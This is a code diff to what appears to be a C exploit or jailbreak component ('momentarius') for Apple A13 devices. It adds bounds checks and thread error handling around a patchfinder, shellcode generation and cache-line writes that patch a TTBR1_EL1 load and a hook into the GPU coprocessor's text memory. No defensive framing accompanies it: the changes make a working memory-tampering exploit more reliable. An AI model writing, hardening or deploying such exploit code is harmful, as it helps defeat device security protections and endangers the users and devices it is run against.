@@ -84,6 +84,7 @@ static void *wait_for_pte(void *data) {
 
 static int gfx_run_patchfinder(void) {
     uint64_t second_page = map_phys_data(momentarius.gfx.text_pa + 0x4000, 0x4000);
+    if (second_page == 0) return -1;
     momentarius.gfx.method = 1;
     
     uint32_t msr = 0xD5182020; // msr TTBR1_EL1, x0
@@ -149,8 +150,10 @@ static int gfx_run_patchfinder(void) {
         }
     }
     
-    if (momentarius.gfx.ttbr1_load_offset == 0) return -1;
-    if (momentarius.gfx.hook_offset == 0) return -1;
+    if (momentarius.gfx.ttbr1_load_offset == 0 ||
+        momentarius.gfx.ttbr1_load_offset >= momentarius.gfx.text_size ||
+        momentarius.gfx.hook_offset == 0 ||
+        momentarius.gfx.hook_offset >= momentarius.gfx.text_size) return -1;
     momentarius.gfx.shc_offset = 0x2000; // seems like 0x2000 is always usable
     
     debug_log("ttbr1_load_offset: 0x%x\n", momentarius.gfx.ttbr1_load_offset);
@@ -217,7 +220,10 @@ int momentarius_init_A13(void) {
     momentarius.gfx.data_va = *(volatile uint64_t *)(info_struct - 0x28);
     debug_log("data_va: 0x%llx\n", momentarius.gfx.data_va);
     
-    momentarius.gfx.data_size = *(volatile uint64_t *)(info_struct - 0x20) - momentarius.gfx.data_va;
+    uint64_t data_end_va = *(volatile uint64_t *)(info_struct - 0x20);
+    if (momentarius.gfx.data_va <= momentarius.gfx.text_va ||
+        data_end_va <= momentarius.gfx.data_va) return -1;
+    momentarius.gfx.data_size = data_end_va - momentarius.gfx.data_va;
     debug_log("data_size: 0x%llx\n", momentarius.gfx.data_size);
     
     momentarius.gfx.text_size = momentarius.gfx.data_va - momentarius.gfx.text_va;
@@ -306,6 +312,20 @@ int momentarius_init_A13(void) {
     
     if (gfx_run_patchfinder() != 0) return -1;
     if (gfx_gen_shellcode() != 0) return -1;
+
+    uint32_t shellcode_size = momentarius.gfx.method == 2 ? 0x28 : 0x48;
+    uint32_t ttbr1_load_size = momentarius.gfx.method == 2 ? 0x10 : 0x8;
+    if (momentarius.gfx.shc_offset > momentarius.gfx.text_size ||
+        shellcode_size > momentarius.gfx.text_size - momentarius.gfx.shc_offset ||
+        momentarius.gfx.ttbr1_load_offset > momentarius.gfx.text_size ||
+        ttbr1_load_size > momentarius.gfx.text_size - momentarius.gfx.ttbr1_load_offset ||
+        momentarius.gfx.hook_offset > momentarius.gfx.text_size ||
+        0x4 > momentarius.gfx.text_size - momentarius.gfx.hook_offset ||
+        (momentarius.gfx.ttbr1_load_offset & 0x3fff) + ttbr1_load_size > 0x4000 ||
+        (momentarius.gfx.hook_offset & 0x3fff) + 0x4 > 0x4000) {
+        debug_log("patch sites are outside mapped text bounds\n");
+        return -1;
+    }
     
     uint64_t shc_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.shc_offset);
     uint64_t ttbr1_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.ttbr1_load_offset);
@@ -319,8 +339,12 @@ int momentarius_init_A13(void) {
     uint64_t hook_input = (uint64_t)momentarius.gfx.hook_data;
     uint64_t hook_output = hook_page + (momentarius.gfx.hook_offset & 0x3fff);
     
-    pthread_t wait_thread = NULL;
-    pthread_create(&wait_thread, NULL, wait_for_pte, (void *)hook_input);
+    pthread_t wait_thread;
+    int thread_result = pthread_create(&wait_thread, NULL, wait_for_pte, (void *)hook_input);
+    if (thread_result != 0) {
+        debug_log("failed to start PTE waiter: %d\n", thread_result);
+        return -1;
+    }
     
     gfx_write_cachelines(shc_input, shc_output, ttbr1_input, ttbr1_output, hook_input, hook_output);
     pthread_join(wait_thread, NULL);
